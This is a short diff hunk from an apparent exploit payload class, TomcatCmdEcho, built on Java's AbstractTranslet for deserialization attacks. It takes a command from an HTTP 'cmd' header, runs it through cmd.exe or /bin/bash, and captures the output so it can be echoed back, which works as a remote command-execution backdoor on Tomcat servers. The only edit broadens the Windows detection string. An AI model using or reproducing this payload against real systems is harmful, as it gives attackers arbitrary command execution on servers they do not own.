@@ -54,7 +54,7 @@ public class TomcatCmdEcho extends AbstractTranslet {
                         str = (String) req.getClass().getMethod("getHeader", new Class[]{String.class}).invoke(req, new Object[]{"cmd"});
                         if (str != null && !str.isEmpty()) {
                             resp.getClass().getMethod("setStatus", new Class[]{int.class}).invoke(resp, new Object[]{new Integer(200)});
-                            String[] cmds = System.getProperty("os.name").toLowerCase().contains("window") ? new String[]{"cmd.exe", "/c", str} : new String[]{"/bin/bash", "-c", str};
+                            String[] cmds = System.getProperty("os.name").toLowerCase().contains("win") ? new String[]{"cmd.exe", "/c", str} : new String[]{"/bin/bash", "-c", str};
                             byte[] result = (new java.util.Scanner((new ProcessBuilder(cmds)).start().getInputStream())).useDelimiter("\\A").next().getBytes();
                             try {
                                 Class cls = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
